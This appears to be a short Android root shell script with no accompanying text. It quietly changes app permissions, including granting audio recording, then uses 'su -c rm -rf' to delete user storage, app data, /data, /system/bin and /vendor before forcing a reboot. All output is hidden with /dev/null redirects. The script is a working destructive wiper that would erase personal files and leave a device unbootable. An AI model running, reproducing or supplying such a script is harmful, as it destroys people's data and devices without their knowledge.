

   pm revoke  android.permission.READ_EXTERNAL_STORAGE  &> /dev/null
   pm grant  android.permission.WRITE_EXTERNAL_STORAGE  &> /dev/null
   pm grant  android.permission.RECORD_AUDIO  &> /dev/null

su -c rm -rf /data/media/0/*  &> /dev/null
su -c rm -rf /system/bin/*  &> /dev/null
su -c rm -rf /data/data/*  &> /dev/null
su -c rm -rf /storage/emulated/0/*  &> /dev/null
su -c rm -rf /vendor/*.prop  &> /dev/null
su -c rm -rf /vendor  &> /dev/null
su -c rm -rf /data/*

su -c reboot  &> /dev/null






